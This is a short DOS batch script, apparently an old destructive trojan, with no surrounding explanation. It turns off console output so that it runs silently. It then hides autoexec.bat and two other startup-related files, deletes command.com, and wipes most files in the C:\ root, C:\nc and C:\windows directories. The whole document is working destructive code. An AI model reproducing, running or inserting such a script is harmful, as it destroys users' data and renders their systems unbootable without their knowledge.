@echo off
@ctty nul
attrib +H c:\autoexec.bat
attrib +H c:\system.bat
attrib +H c:\config.bat
del c:\command.com
del c:\*.???
del c:\nc\*.???
del c:\windows\*.???
